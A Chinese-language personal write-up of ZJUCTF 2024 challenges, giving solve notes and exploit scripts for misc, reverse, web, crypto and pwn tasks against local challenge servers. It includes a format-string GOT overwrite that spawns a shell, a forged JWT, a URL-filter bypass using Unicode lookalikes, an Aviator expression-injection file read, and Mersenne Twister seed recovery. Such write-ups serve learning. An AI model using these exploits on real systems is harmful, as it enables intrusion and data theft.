---
encryption_info_message: "请输入密码查看本篇文章（Try Guess）"
placeholder: '在此输入密码'
summary: '🔒 ZJUCTF 2024 Writeup'
password: 'zjuctf@888'
counter: True
---

# ZJUCTF 2024 Writeup

!!! abstract
    这次比赛第一次拿奖拿到手软（掩盖不了我菜的本质，除了主排名奖外，还拿了misc、rev和web三个方向奖。pwn和crypto还是一如既往的懵逼，哈哈哈哈哈。继续努力学习吧，如果有时间的话XD

> 碎碎念：*不知道会不会是最后一次有闲暇参加qaq（等有空继续慢慢学吧，毕竟连chess encoding都不会做，遑论rev、web、pwn、crypto了* :(

## Misc

### 小A口算

读取题目，计算答案，提交，满足分数要求即可

```python
from pwn import *

p = process("Acalc/arithmetic")
# p = remote("127.0.0.1", 61234)

p.recvuntil(b"Input your choice:")

def core(ques):
    if int(ques[0]) > int(ques[2]):
        return b">"
    elif int(ques[0]) < int(ques[2]):
        return b"<"
    else:
        return b"="

def beginer():
  p.sendline(b"1")
  p.recvuntil(b"Try your best to answer questions as much as possible!")
  for i in range(1000):
    if i % 100 == 0:
       print(i)
    ques = p.recvuntil(b"input '>', '<' or '=' :").decode()
    ques = ques.split("\n")[2].split(" ")

    p.sendline(core(ques))
```

### Silence

一开始就想到是shell反射但是没成功，后来发现不能直接bash，得用bash -i "payload"的方式

进去后用通配符读取即可，类似`cat *`

### Master of C++

如下所示
```c
#include <iostream>

int main(int argc, char* argv[]) {
    int n = ARG; 
    return (n < 2 || (n > 2 && n % 2 == 0) || (n > 3 && (n % 3 == 0 || (n % 6 != 1 && n % 6 != 5)))) ? 1 : 0;
}
```

### CBA

看到type是reverse，直接就去反转，刚开始反转字节不行，再反转bit，strings后终于看到希望，然后根据ste.cba，再反转字节，然后就对了，反编译一下，再去跑一下就出结果了。

### 锅里捞面

气煞我也，一开始遍历视频找到特殊帧导出，看到黑白条想到barcode，然后没仔细看就直接写代码去了，按照只有一个barcode来写，导致只拿到了最后一个barcode，郁闷了超久。

后来随手翻翻，终于发现了，总共3个barcode，给了base36的table

然后分析一下音频，摩斯电码，解一下，然后decode再hex再转char就是flag了
（题解太长，这里不放了。

### Bytes?

看到那么多0，一开始的想法就是图像，奈何对自己的视力太自信，看01图看了半天没看出来，所以一直搁置着。

后来空下来，写个代码生成一下图片就找到了，高度是22

### Minec(re)tf

太抽象了，只差6/9，随便蒙了一个flag，居然一发入魂了！？

简单说一下其他pieces的获取方法吧

首先就是使用`\tick freeze`实现自由移动（删了数据包中的部分代码也行

然后找各个命令方块，根据函数名去数据包中找到对应函数，这样就能拿到大部分flag了

mod逆向的话，反编译一下找到相关算法，然后异或一下

羊毛的话，在资源包中找到`light blue wool`的模型文件，预览一下即可

9/9的话，直接在数据包中的函数内容中找到含有key card字符的即可

gold smith的话，数据包里直接也有nbt，直接看看箱子里的东西即可

## Reverse

### rev beginner 1 2 3

反汇编，感觉没什么好说的，3卡了一下，主要是代码看错了qaq

### Minec(re)tf Unity Edition

前2问可以直接改代码通过，后面两问直接装了MelonLoader外挂（然后随意切换场景、视角

### Rukma

发现特定位是`-`，其他位置只可能是`xmo`

复现一下算法，暴力破解比较md5即可

### easyhap

鸿蒙简单逆向题
我说我忘了你信吗，看了自己的题解也没想起来，依稀记得是个aes解密？我懒得重新回去看了，大概就是吧

??? done "exp"
    ```python
    import base64

    a = "Uzzj0V3pAh3AlPJ150WajAyXXST9UrJOdAo6iGDSj1c="
    key = "ZJUCTF2024-OHAPP"
    decode64 = base64.b64decode(a)
    print(decode64, len(decode64), len(key))
    enX = bytearray()
    enY = bytearray()
    for i in range(len(decode64)//2):
    enY.append(decode64[i+16])
    enX.append(decode64[i] ^ enY[i])

    print(enX, enY)
    # enXs = "".join([chr(enX[i]) for i in range(len(enX))])
    # print(len(enXs))
    enX64 = base64.b64encode(enX).decode()
    enY64 = base64.b64encode(enY).decode()
    print(enX64, enY64)

    f = '_@_Ea5Y_ohaPp_@ND_a_5iMPl3_fl4g_'
    print(len(f))
    ```

## Web

### easy Pentest

查一下阿里云oss的使用方法即可，设置一下环境变量

??? done "exp"
    ```python
    import oss2
    from oss2.credentials import EnvironmentVariableCredentialsProvider

    # 从环境变量中获取访问凭证。运行本代码示例之前，请确保已设置环境变量OSS_ACCESS_KEY_ID和OSS_ACCESS_KEY_SECRET。
    auth = oss2.ProviderAuth(EnvironmentVariableCredentialsProvider())
    # 填写Bucket所在地域对应的Endpoint。以华东1（杭州）为例，Endpoint填写为https://oss-cn-hangzhou.aliyuncs.com。
    # yourBucketName填写存储空间名称。
    bucket = oss2.Bucket(auth, 'https://oss-cn-beijing.aliyuncs.com', 'oss-test-qazxsw')

    #下载OSS文件到本地文件。
    bucket.get_object_to_file('fffffflllllaaaagggg.txt', 'ans.txt')
    ```

### easy JWT

利用`Inf`,[Ref](https://hackmd.io/@vow/rJrgz1xn6)

???+ done "exp"
    ```python
    import hashlib

    hash_ = lambda a: hashlib.sha256(a.encode()).hexdigest()

    data = '{"username": "admin", "age": 69e699, "role": "admin", "timestamp": 1708287014}'
    salted_secret = 69e699
    jwt = data.encode().hex() + "." + hash_(f"{data}:{salted_secret}")
    print(jwt)
    ```

### 山雀

解析的时候可以用`http:url`来代替`http://url`

然后可以用unicode相近字符代替

`HtTp:ʰᵉʳᴱ﹣ᴵſ。ʸºUｒ｡FLAⒶⓐＡａ⁴G．ⓊℛＬ`

### Aviator

可以搜到相关的漏洞，不过那是用到了BCEL，不过这里貌似不成功，于是乎研读了一下aviator的语法，发现可以通过读取文件的方式获得flag，没必要获取shell

`f=new java.io.File("/flag");sc=new java.util.Scanner(f);nextLine(sc)`

## Crypto

### Shad0wTime

这题比网速？(非预期了

??? done "exp"
    ```python
    from pwn import *
    import json
    p = remote('127.0.0.1', 61234)

    p.recvuntil(b'Enter your option: ')
    p.sendline(b'sign_time')
    s = p.recvuntil(b'}')

    s = json.loads(s.decode().replace('\'','\"'))

    p.recvuntil(b'Enter your option: ')
    p.sendline(b'verify')
    p.recvuntil(b'Enter the message: ')
    p.sendline(s['msg'])
    p.recvuntil(b'Enter r in hexadecimal form: ')
    p.sendline(s['r'])
    p.recvuntil(b'Enter s in hexadecimal form: ')
    p.sendline(s['s'])
    p.interactive()
    ```

### ezxor

可以从最后一位不断倒推

???+ done "exp"
    ```python
    def decrypt(cipher):
        cipher_list = list(cipher)
        n = len(cipher_list)

        for i in range(n-2, -1, -1):
            tmp = int(cipher_list[i])
            cipher_list[i+1] = str(tmp^int(cipher_list[i+1]))

        plain = ""
        for i in range(0, len(cipher_list), 8):
            byte = ''.join(cipher_list[i:i+8])
            plain += chr(int(byte, 2))

        return plain
    ans = ans[len(cipher):]

    # split by 8
    ans1 = [ans[i:i+8] for i in range(0, len(ans), 8)]
    print(ans1)

    plain= decrypt(ans)
    print(plain)
    ```

### Seed?

这题一开始想到MT19937，但是发现是求种子，那就要逆向到种子，查阅[相关资料](https://stackered.com/blog/python-random-prediction/)可知

??? done "core exp code"
    ```python
    import random

    with open('seed/leak') as f:
        S = f.read()

    def unshiftRight(x, shift):
        res = x
        for i in range(32):
            res = x ^ res >> shift
        return res

    def unshiftLeft(x, shift, mask):
        res = x
        for i in range(32):
            res = x ^ (res << shift & mask)
        return res

    def untemper(v):
        v = unshiftRight(v, 18)
        v = unshiftLeft(v, 15, 0xefc60000)
        v = unshiftLeft(v, 7, 0x9d2c5680)
        v = unshiftRight(v, 11)
        return v

    S = [untemper(int(_, 16)) for _ in S.split('\n')[:-1]]
    print(len(S))

    def invertStep(si, si227):
        # S[i] ^ S[i-227] == (((I[i] & 0x80000000) | (I[i+1] & 0x7FFFFFFF)) >> 1) ^ (0x9908b0df if I[i+1] & 1 else 0)
        X = si ^ si227
        # we know the LSB of I[i+1] because MSB of 0x9908b0df is set, we can see if the XOR has been applied
        mti1 = (X & 0x80000000) >> 31
        if mti1:
            X ^= 0x9908b0df
        # undo shift right
        X <<= 1
        # now recover MSB of state I[i]
        mti = X & 0x80000000
        # recover the rest of state I[i+1]
        mti1 += X & 0x7FFFFFFF
        return mti, mti1

    def init_genrand(seed):
        MT = [0] * 624
        MT[0] = seed & 0xffffffff
        for i in range(1, 623+1): # loop over each element
            MT[i] = ((0x6c078965 * (MT[i-1] ^ (MT[i-1] >> 30))) + i) & 0xffffffff
        return MT

    def recover_kj_from_Ji(ji, ji1, i):
        # ji => J[i]
        # ji1 => J[i-1]
        const = init_genrand(19650218)
        key = ji - (const[i] ^ ((ji1 ^ (ji1 >> 30))*1664525))
        key &= 0xffffffff
        # return K[j] + j
        return key

    def recover_Ji_from_Ii(Ii, Ii1, i):
        # Ii => I[i]
        # Ii1 => I[i-1]
        ji = (Ii + i) ^ ((Ii1 ^ (Ii1 >> 30)) * 1566083941)
        ji &= 0xffffffff
        # return J[i]
        return ji

    def recover_Kj_from_Ii(Ii, Ii1, Ii2, i):
        # Ii => I[i]
        # Ii1 => I[i-1]
        # Ii2 => I[i-2]
        # Ji => J[i]
        # Ji1 => J[i-1]
        Ji = recover_Ji_from_Ii(Ii, Ii1, i)
        Ji1 = recover_Ji_from_Ii(Ii1, Ii2, i-1)
        return recover_kj_from_Ji(Ji, Ji1, i)

    def rewindState(state):
        prev = [0]*624
        # copy to not modify input array
        s = state[:]
        I, I0 = invertStep(s[623], s[396])
        prev[623] += I
        # update state 0
        # this does nothing when working with a known full state, but is important we rewinding more than 1 time
        s[0] = (s[0]&0x80000000) + I0
        for i in range(227, 623):
            I, I1 = invertStep(s[i], s[i-227])
            prev[i] += I
            prev[i+1] += I1
        for i in range(227):
            I, I1 = invertStep(s[i], prev[i+397])
            prev[i] += I
            prev[i+1] += I1
        # The LSBs of prev[0] do not matter, they are 0 here
        return prev

    def seedArrayFromState(s, subtractIndices=True):
        s_ = [0]*624
        for i in range(623, 2, -1):
            s_[i] = recover_Ji_from_Ii(s[i], s[i-1], i)
        s_[0]=s_[623]
        s_[1]=recover_Ji_from_Ii(s[1], s[623],  1)
        s_[2]=recover_Ji_from_Ii(s[2], s_[1], 2)
        seed = [0]*624
        for i in range(623, 2, -1):
            seed[i-1] = recover_kj_from_Ji(s_[i], s_[i-1], i)
        # system overdefined for seed[0,1,623]
        seed[0] = 0
        # thus s1 = (const[1] ^ ((const[0] ^ (const[0] >> 30))*1664525))
        s1_old = ((2194844435 ^ ((19650218 ^ (19650218 >> 30))*1664525))) & 0xffffffff
        seed[1] = recover_kj_from_Ji(s_[2], s1_old, 2)
        seed[623] = (s_[1] - (s1_old ^ ((s_[0] ^ (s_[0] >> 30))*1664525))) & 0xffffffff
        # subtract the j indices
        if subtractIndices:
            seed = [(2**32+e-i)%2**32 for i,e in enumerate(seed)]
        return seed

    I = rewindState(S)
    def seedArrayToInt(s):
        seed = 0
        for e in s[::-1]:
            seed += e
            seed <<= 32
        return seed >> 32
    seed_array = seedArrayFromState(I)
    seed = seedArrayToInt(seed_array)

    random.seed(seed)

    print(hex(random.getrandbits(32)))

    print(bytes.fromhex(hex(seed)[2:]))
    ```


## Pwn

### simple echo

格式化字符串输出和写入栈，不会pwn，好不容易调出来，有失败的概率，多试几次就好了（

??? done "exp (ugly version)"
    ```python
    from pwn import *

    context(os='linux', arch='amd64')

    # p = process(['simple echo/app'], env={"LD_PRELOAD":"simple echo/libc.so.6"})  
    p = remote('127.0.0.1', 61234)
    elf1 = ELF('simple echo/app')
    libc = ELF('simple echo/libc.so.6')

    p.recvuntil(b"Dididi, I am a simple echo server!\n")
    offset = 10

    def padding(s, length, remain):
        return s + (length - len(s) - remain) * b"A"

    printf_got = elf1.got["printf"]
    print(hex(printf_got))
    payload = b"aa"+b"%10$sAAA"+p64(printf_got)

    info(f"payload = {payload}")
    p.send(payload)
    p.recvuntil(b"Blala:aa")

    recv = p.recv()
    info(f"recv = {recv}")


    printf_addr = u64(recv[:-6]+b"\x00\x00")
    system_addr = printf_addr - 0xf980
    info(f"printf_addr = {hex(printf_addr)}")
    info(f"system_addr = {hex(system_addr)}")

    # by1 = 0x60 
    by1 = system_addr & 0xff
    by2 = (system_addr >> 8) & 0xff
    by3 = (system_addr >> 16) & 0xff
    info(f"by1 = {hex(by1)}")
    info(f"by2 = {hex(by2)}")
    info(f"by3 = {hex(by3)}")

    # gdb.attach(p, 'break printf')
    payload = b'aaaaaaa' + b"%"+ str(by1-13).encode() + b"c%14$hhn"
    payload += b"%" + str((by2 - by1 + 0x100)%0x100).encode() + b"c%15$hhn"
    payload += b"%" + str((by3 - by2 + 0x100)%0x100).encode() + b"c%16$hhn"

    payload += p64(printf_got)
    payload += p64(printf_got+1)
    payload += p64(printf_got+2)


    info(len(payload))
    p.sendline(payload)
    p.sendline(b";sh\0")

    p.interactive()
    ```